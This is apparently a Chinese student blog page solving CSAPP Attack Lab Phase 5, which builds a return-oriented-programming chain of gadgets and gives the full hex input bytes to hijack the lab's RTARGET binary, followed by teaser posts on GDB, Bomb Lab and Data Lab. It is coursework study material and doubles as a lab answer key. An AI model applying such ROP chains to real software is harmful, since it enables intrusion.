<p>Before you take on the Phase 5, pause to consider what you have accomplished so far. In Phases 2 and 3, you caused a program to execute machine code of your own design. If CTARGET had been a network server, you could have injected your own code into a distant machine. In Phase 4, you circumvented two of the main devices modern systems use to thwart buffer overflow attacks. Although you did not inject your own code, you were able inject a type of program that operates by stitching together sequences of existing code. You have also gotten 95&#x2F;100 points for the lab. That’s a good score. If you have other pressing obligations consider stopping right now. Phase 5 requires you to do an ROP attack on RTARGET to invoke function touch3 with a pointer to a string representation of your cookie. That may not seem significantly more difficult than using an ROP attack to invoke touch2, except that we have made it so. Moreover, Phase 5 counts for only 5 points, which is not a  true measure of the effort it will require. Think of it as more an extra credit problem for those who want to go beyond the normal expectations for the course.</p>
</blockquote>
<p>现在是晚上 23:20，我本来已经头昏眼花准备就寝明日再战。但看到这段话，好家伙，不仅没把我劝退，还让我的困意一下子消失，精神振奋了起来。</p>
<p><strong>长缨已在手，缚住苍龙就在今日！</strong></p>
<h3 id="分析-4"><a href="#分析-4" class="headerlink" title="分析"></a>分析</h3><p>本题的任务与<code>Phase 3</code>相同，都是要求返回到<code>touch3</code>函数</p>
<p><code>Phase 3</code>中用到的注入代码为：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">movq    $0x5561dca8, %rdi</span><br><span class="line">pushq   $0x4018fa</span><br><span class="line">ret</span><br></pre></td></tr></table></figure>

<p>其中<code>0x5561dca8</code>是栈中<code>cookie</code>存放的地址。</p>
<p>而在本题中，栈的位置是随机的，把<code>cookie</code>存放在栈中似乎不太现实，但是我们又不得不这样做，那么有什么办法呢？只能在代码中获取<code>%rsp</code>的地址，然后根据偏移量来确定<code>cookie</code>的地址。想到这，思路就明晰了。</p>
<p>查表，<code>movq %rsp, xxx</code>表示为<code>48 89 xx</code>，查找一下有没有可用的<code>gadget</code></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">0000000000401aab &lt;setval_350&gt;:</span><br><span class="line">  401aab:       c7 07 48 89 e0 90       movl   $0x90e08948,(%rdi)</span><br><span class="line">  401ab1:       c3                      retq</span><br></pre></td></tr></table></figure>

<p>还真找到了，<code>48 89 e0</code>对应的汇编代码为</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">movq %rsp, %rax</span><br></pre></td></tr></table></figure>

<p>地址为：<code>0x401aad</code></p>
<p>根据提示，有一个<code>gadget</code>一定要用上</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">00000000004019d6 &lt;add_xy&gt;:</span><br><span class="line">  4019d6:       48 8d 04 37             lea    (%rdi,%rsi,1),%rax</span><br><span class="line">  4019da:       c3                      retq</span><br></pre></td></tr></table></figure>

<p>地址为：<code>0x4019d6</code></p>
<p>通过合适的赋值，这段代码就能实现<code>%rsp</code>加上段内偏移地址来确定<code>cookie</code>的位置</p>
<p>剩下部分流程与<code>Phase 3</code>一致，大体思路如下：</p>
<ul>
<li>先取得栈顶指针的位置</li>
<li>取出存在栈中得偏移量的值</li>
<li>通过<code>lea    (%rdi,%rsi,1),%rax</code>得到 cookie 的地址</li>
<li>将 cookie 的地址传给<code>%rdi</code></li>
<li>调用<code>touch 3</code></li>
</ul>
<p>由于<code>gadget</code>的限制，中间的细节需要很多尝试，尝试过程不再一一列举了，我们直接给出代码</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">#地址：0x401aad</span><br><span class="line">movq %rsp, %rax</span><br><span class="line">ret</span><br><span class="line"></span><br><span class="line">#地址：0x4019a2</span><br><span class="line">movq %rax, %rdi</span><br><span class="line">ret</span><br><span class="line"></span><br><span class="line">#地址：0x4019cc</span><br><span class="line">popq %rax</span><br><span class="line">ret</span><br><span class="line"></span><br><span class="line">#地址：0x4019dd</span><br><span class="line">movl %eax, %edx</span><br><span class="line">ret</span><br><span class="line"></span><br><span class="line">#地址：0x401a70</span><br><span class="line">movl %edx, %ecx</span><br><span class="line">ret</span><br><span class="line"></span><br><span class="line">#地址：0x401a13</span><br><span class="line">movl %ecx, %esi</span><br><span class="line">ret</span><br><span class="line"></span><br><span class="line">#地址：0x4019d6</span><br><span class="line">lea    (%rdi,%rsi,1),%rax</span><br><span class="line">ret</span><br><span class="line"></span><br><span class="line">#地址：0x4019a2</span><br><span class="line">movq %rax, %rdi</span><br><span class="line">ret</span><br></pre></td></tr></table></figure>

<h3 id="栈帧讲解-3"><a href="#栈帧讲解-3" class="headerlink" title="栈帧讲解"></a>栈帧讲解</h3><p>为节省空间，每一行代码都省略了后面的<code>ret</code>，</p>
<p><img src="https://cdn.jsdelivr.net/gh/Deconx/ImgHosting/Deconx-pic/image-20220305192432219.png" alt="image-20220305192432219"></p>
<p>逻辑在图上标的很清楚，这里就不再用文字写啦！</p>
<p><strong>要注意</strong>，<code>getbuf</code>执行<code>ret</code>后相当于进行了一次<code>pop</code>操作，<code>test</code>的栈顶指针<code>%rsp=%rsp+0x8</code>，所以<code>cookie</code>相对于此时栈顶指针的偏移量是<code>0x48</code>而不是<code>0x50</code></p>
<h3 id="Solution-4"><a href="#Solution-4" class="headerlink" title="Solution"></a>Solution</h3><p>根据上图的栈帧，写出输入序列：</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">00 00 00 00 00 00 00 00 </span><br><span class="line">00 00 00 00 00 00 00 00</span><br><span class="line">00 00 00 00 00 00 00 00 </span><br><span class="line">00 00 00 00 00 00 00 00</span><br><span class="line">00 00 00 00 00 00 00 00 </span><br><span class="line">ad 1a 40 00 00 00 00 00 </span><br><span class="line">a2 19 40 00 00 00 00 00 </span><br><span class="line">cc 19 40 00 00 00 00 00 </span><br><span class="line">48 00 00 00 00 00 00 00 </span><br><span class="line">dd 19 40 00 00 00 00 00 </span><br><span class="line">70 1a 40 00 00 00 00 00 </span><br><span class="line">13 1a 40 00 00 00 00 00 </span><br><span class="line">d6 19 40 00 00 00 00 00 </span><br><span class="line">a2 19 40 00 00 00 00 00 </span><br><span class="line">fa 18 40 00 00 00 00 00 </span><br><span class="line">35 39 62 39 39 37 66 61</span><br></pre></td></tr></table></figure>

<p><img src="https://cdn.jsdelivr.net/gh/Deconx/ImgHosting/Deconx-pic/image-20220305193301330.png" alt="image-20220305193301330"></p>
<p><strong>Pass! 攻击成功！</strong></p>
<h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><ul>
<li>本实验涉及的内容在课本中只有短短几页的篇幅，而实际操作中却要考虑如此多的东西，确实是那句话“纸上得来终觉浅，绝知此事要躬行”。五个<code>Phase</code>的难度是层层递进的，<code>Part 1</code>让我对部分汇编指令以及栈的原理有了更深的领悟；<code>Part 2</code>可能就更加贴合实际工程项目了，我在这里初步学习了“ROP”这一天才的攻击技术，实现成功的攻击需要对每一个字节都能有足够的敏感。同时，在我以后编写的代码中，也应该注意到缓冲区溢出的问题</li>
<li>本实验耗时2天，约9小时</li>
</ul>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="https://deconx.top/2022/02/22/gdb/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/panda.jpg">
      <meta itemprop="name" content="西门吹水">
      <meta itemprop="description" content="天行健，君子以自强不息">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="潜龙勿用">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2022/02/22/gdb/" class="post-title-link" itemprop="url">GDB 调试器的使用</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">发表于</span>

              <time title="创建时间：2022-02-22 23:07:33" itemprop="dateCreated datePublished" datetime="2022-02-22T23:07:33+08:00">2022-02-22</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">更新于</span>
                <time title="修改时间：2022-02-25 14:20:43" itemprop="dateModified" datetime="2022-02-25T14:20:43+08:00">2022-02-25</time>
              </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">分类于</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/Linux/" itemprop="url" rel="index"><span itemprop="name">Linux</span></a>
                </span>
            </span>

          <br>
            <span class="post-meta-item" title="本文字数">
              <span class="post-meta-item-icon">
                <i class="far fa-file-word"></i>
              </span>
                <span class="post-meta-item-text">本文字数：</span>
              <span>2.7k</span>
            </span>
            <span class="post-meta-item" title="阅读时长">
              <span class="post-meta-item-icon">
                <i class="far fa-clock"></i>
              </span>
                <span class="post-meta-item-text">阅读时长 &asymp;</span>
              <span>2 分钟</span>
            </span>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <p><strong>本文只列出与BombLab实验相关的部分指令</strong></p>
<h2 id="基本信息查看"><a href="#基本信息查看" class="headerlink" title="基本信息查看"></a>基本信息查看</h2><h3 id="栈信息"><a href="#栈信息" class="headerlink" title="栈信息"></a>栈信息</h3><p>不管是操作转储文件还是用GDB设置断点进行调试，都可以输入 (gdb)bt 打印栈内容进行查看。一般的宕机BUG，看下宕机的位置，然后看下源代码基本就可以解决了。但是很多情况下简单的 (gdb)bt 还查不到问题，这时候就要涉及到比较复杂的操作。下面罗列了一些对栈的操作：</p>
<ul>
<li><code>(gdb) bt</code>：显示所有栈帧</li>
<li><code>(gdb) bt 10</code>：显示前面10个栈帧</li>
<li><code>(gdb) bt -10</code>：显示后面10个栈帧</li>
<li><code>(gdb) bt full</code>：显示栈帧以及局部变量</li>
<li><code>(gdb) bt full 10</code>：显示前面10个栈帧以及局部变量
          <!--noindex-->
            <div class="post-button">
              <a class="btn" href="/2022/02/22/gdb/#more" rel="contents">
                阅读全文 &raquo;
              </a>
            </div>
          <!--/noindex-->
        
      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="https://deconx.top/2022/02/22/CSAPP-Lab02/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/panda.jpg">
      <meta itemprop="name" content="西门吹水">
      <meta itemprop="description" content="天行健，君子以自强不息">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="潜龙勿用">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2022/02/22/CSAPP-Lab02/" class="post-title-link" itemprop="url">CSAPP-Lab02 Bomb Lab 记录</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">发表于</span>

              <time title="创建时间：2022-02-22 20:19:01" itemprop="dateCreated datePublished" datetime="2022-02-22T20:19:01+08:00">2022-02-22</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">更新于</span>
                <time title="修改时间：2022-03-11 23:52:51" itemprop="dateModified" datetime="2022-03-11T23:52:51+08:00">2022-03-11</time>
              </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">分类于</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/CSAPP-Lab/" itemprop="url" rel="index"><span itemprop="name">CSAPP Lab</span></a>
                </span>
            </span>

          <br>
            <span class="post-meta-item" title="本文字数">
              <span class="post-meta-item-icon">
                <i class="far fa-file-word"></i>
              </span>
                <span class="post-meta-item-text">本文字数：</span>
              <span>25k</span>
            </span>
            <span class="post-meta-item" title="阅读时长">
              <span class="post-meta-item-icon">
                <i class="far fa-clock"></i>
              </span>
                <span class="post-meta-item-text">阅读时长 &asymp;</span>
              <span>23 分钟</span>
            </span>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <blockquote>
<p>GDB的全称是：GNU symbolic debugger。在做实验之前，了解常见的GDB命令是必不可少的。常见GDB命令可以访问：<a href="https://deconx.top/2022/02/22/gdb/">https://deconx.top/2022/02/22/gdb/</a></p>
</blockquote>
<h1 id="实验概览"><a href="#实验概览" class="headerlink" title="实验概览"></a>实验概览</h1><p><code>BombLab</code>提供给我们的文件非常简单，只有一个编译不了的C文件<code>bomb.c</code>，和一个目标代码文件<code>bomb</code>。当运行<code>bomb</code>文件时，它会要求输入6个字符串，如果其中的任何一句是错的，炸弹就会“爆炸”。我们必须利用反汇编工具逆向分析这个文件，并找到这6个字符串，从而“拆除”炸弹。</p>
<p><strong>这个实验看起来就非常有趣！</strong></p>
<p>运行一下<code>bomb</code>文件：
          <!--noindex-->
            <div class="post-button">
              <a class="btn" href="/2022/02/22/CSAPP-Lab02/#more" rel="contents">
                阅读全文 &raquo;
              </a>
            </div>
          <!--/noindex-->
        
      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="https://deconx.top/2022/02/10/CSAPP-Lab01/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/panda.jpg">
      <meta itemprop="name" content="西门吹水">
      <meta itemprop="description" content="天行健，君子以自强不息">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="潜龙勿用">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2022/02/10/CSAPP-Lab01/" class="post-title-link" itemprop="url">CSAPP-Lab01 Data Lab 记录</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">发表于</span>

              <time title="创建时间：2022-02-10 17:15:14" itemprop="dateCreated datePublished" datetime="2022-02-10T17:15:14+08:00">2022-02-10</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">更新于</span>
                <time title="修改时间：2022-03-03 22:56:47" itemprop="dateModified" datetime="2022-03-03T22:56:47+08:00">2022-03-03</time>
              </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">分类于</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/CSAPP-Lab/" itemprop="url" rel="index"><span itemprop="name">CSAPP Lab</span></a>
                </span>
            </span>

          <br>
            <span class="post-meta-item" title="本文字数">
              <span class="post-meta-item-icon">
                <i class="far fa-file-word"></i>
              </span>
                <span class="post-meta-item-text">本文字数：</span>
              <span>11k</span>
            </span>
            <span class="post-meta-item" title="阅读时长">
              <span class="post-meta-item-icon">
                <i class="far fa-clock"></i>
              </span>
                <span class="post-meta-item-text">阅读时长 &asymp;</span>
              <span>10 分钟</span>
            </span>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h1 id="总览"><a href="#总览" class="headerlink" title="总览"></a>总览</h1><p><img src="https://cdn.jsdelivr.net/gh/Deconx/ImgHosting/Deconx-pic/20200409205146245.png" alt="题目列表"></p>
<h1 id="Problem-int"><a href="#Problem-int" class="headerlink" title="Problem-int"></a>Problem-int</h1><h2 id="bitXor"><a href="#bitXor" class="headerlink" title="bitXor"></a>bitXor</h2><ul>
<li>bitXor - x^y using only ~ and &amp; </li>
<li>Example: bitXor(4, 5) &#x3D; 1</li>
<li>Legal ops: ~ &amp;</li>
<li>Max ops: 14</li>
</ul>
<p>要求只用“非”和“与”来表示“异或”。首先想到“异或的非&#x3D;同或”：
          <!--noindex-->
            <div class="post-button">
              <a class="btn" href="/2022/02/10/CSAPP-Lab01/#more" rel="contents">
                阅读全文 &raquo;
              </a>
            </div>
          <!--/noindex-->
        
      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  


  
  <nav class="pagination">
    <span class="page-number current">1</span><a class="page-number" href="/page/2/">2</a><a class="extend next" rel="next" href="/page/2/"><i class="fa fa-angle-right" aria-label="下一页"></i></a>
  </nav>



          </div>
          

<script>
  window.addEventListener('tabs:register', () => {
    let { activeClass } = CONFIG.comments;
    if (CONFIG.comments.storage) {
      activeClass = localStorage.getItem('comments_active') || activeClass;
    }
    if (activeClass) {
      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
      if (activeTab) {
        activeTab.click();
      }
    }
  });
  if (CONFIG.comments.storage) {
    window.addEventListener('tabs:click', event => {
      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
      let commentClass = event.target.classList[1];
      localStorage.setItem('comments_active', commentClass);
    });
  }
</script>

        </div>
          
  
  <div class="toggle sidebar-toggle">
    <span class="toggle-line toggle-line-first"></span>
    <span class="toggle-line toggle-line-middle"></span>
    <span class="toggle-line toggle-line-last"></span>
  </div>

  <aside class="sidebar">
    <div class="sidebar-inner">

      <ul class="sidebar-nav motion-element">
        <li class="sidebar-nav-toc">
          文章目录
        </li>
        <li class="sidebar-nav-overview">
          站点概览
        </li>
      </ul>

      <!--noindex-->
      <div class="post-toc-wrap sidebar-panel">
      </div>
      <!--/noindex-->

      <div class="site-overview-wrap sidebar-panel">
        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
    <img class="site-author-image" itemprop="image" alt="西门吹水"
      src="/images/panda.jpg">
  <p class="site-author-name" itemprop="name">西门吹水</p>
  <div class="site-description" itemprop="description">天行健，君子以自强不息</div>
</div>
<div class="site-state-wrap motion-element">
  <nav class="site-state">
      <div class="site-state-item site-state-posts">
          <a href="/archives/">
        
          <span class="site-state-item-count">12</span>
          <span class="site-state-item-name">日志</span>
        </a>
      </div>
      <div class="site-state-item site-state-categories">
            <a href="/categories/">
          
        <span class="site-state-item-count">4</span>
        <span class="site-state-item-name">分类</span></a>
      </div>
      <div class="site-state-item site-state-tags">
            <a href="/tags/">
          
        <span class="site-state-item-count">6</span>
        <span class="site-state-item-name">标签</span></a>
      </div>
  </nav>
</div>
  <div class="links-of-author motion-element">
      <span class="links-of-author-item">
        <a href="https://github.com/Deconx" title="GitHub → https:&#x2F;&#x2F;github.com&#x2F;Deconx" rel="noopener" target="_blank"><i class="fab fa-github fa-fw"></i>GitHub</a>
      </span>
      <span class="links-of-author-item">
        <a href="mailto:1067017428@qq.com" title="E-Mail → mailto:1067017428@qq.com" rel="noopener" target="_blank"><i class="fa fa-envelope fa-fw"></i>E-Mail</a>
      </span>
  </div>
  <div class="cc-license motion-element" itemprop="license">
    <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" class="cc-opacity" rel="noopener" target="_blank"><img src="/images/cc-by-nc-sa.svg" alt="Creative Commons"></a>
  </div>



      </div>
        <div class="back-to-top motion-element">
          <i class="fa fa-arrow-up"></i>
          <span>0%</span>
        </div>

    </div>
  </aside>
  <div id="sidebar-dimmer"></div>


      </div>
    </main>

    <footer class="footer">
      <div class="footer-inner">
        

        
  <div class="beian"><a href="https://beian.miit.gov.cn/" rel="noopener" target="_blank">null </a><a href="http://www.beian.gov.cn/portal/registerSystemInfo?recordcode=2022009343" rel="noopener" target="_blank">鄂ICP备2022009343号 </a>
  </div>

<div class="copyright">
  
  &copy; 
  <span itemprop="copyrightYear">2022</span>
  <span class="with-love">
    <i class="fa fa-heart"></i>
  </span>
  <span class="author" itemprop="copyrightHolder">西门吹水</span>
    <span class="post-meta-divider">|</span>
    <span class="post-meta-item-icon">
      <i class="fa fa-chart-area"></i>
    </span>
    <span title="站点总字数">127k</span>
    <span class="post-meta-divider">|</span>
    <span class="post-meta-item-icon">
      <i class="fa fa-coffee"></i>
    </span>
    <span title="站点阅读时长">1:56</span>
</div>
  <div class="powered-by">由 <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://muse.theme-next.org/" class="theme-link" rel="noopener" target="_blank">NexT.Muse</a> 强力驱动
  </div>

        








      </div>
    </footer>
  </div>

  
  <script src="/lib/anime.min.js"></script>
  <script src="/lib/velocity/velocity.min.js"></script>
  <script src="/lib/velocity/velocity.ui.min.js"></script>

<script src="/js/utils.js"></script>

<script src="/js/motion.js"></script>


<script src="/js/schemes/muse.js"></script>


<script src="/js/next-boot.js"></script>




  




  
<script src="/js/local-search.js"></script>













  

  
      

<script>
  if (typeof MathJax === 'undefined') {
    window.MathJax = {
      loader: {
          load: ['[tex]/mhchem'],
        source: {
          '[tex]/amsCd': '[tex]/amscd',
          '[tex]/AMScd': '[tex]/amscd'
        }
      },
      tex: {
        inlineMath: {'[+]': [['$', '$']]},
          packages: {'[+]': ['mhchem']},
        tags: 'ams'
      },
      options: {
        renderActions: {
          findScript: [10, doc => {
            document.querySelectorAll('script[type^="math/tex"]').forEach(node => {
              const display = !!node.type.match(/; *mode=display/);
              const math = new doc.options.MathItem(node.textContent, doc.inputJax[0], display);
              const text = document.createTextNode('');
              node.parentNode.replaceChild(text, node);
              math.start = {node: text, delim: '', n: 0};
              math.end = {node: text, delim: '', n: 0};
              doc.math.push(math);
            });
          }, '', false],
          insertedScript: [200, () => {
            document.querySelectorAll('mjx-container').forEach(node => {
              let target = node.parentNode;
              if (target.nodeName.toLowerCase() === 'li') {
                target.parentNode.classList.add('has-jax');
              }
            });
          }, '', false]
        }
      }
    };
    (function () {
      var script = document.createElement('script');
      script.src = '//cdn.jsdelivr.net/npm/mathjax@3/es5/tex-mml-chtml.js';
      script.defer = true;
      document.head.appendChild(script);
    })();
  } else {
    MathJax.startup.document.state(0);
    MathJax.texReset();
    MathJax.typeset();
  }
</script>

    

  

</body>
</html>
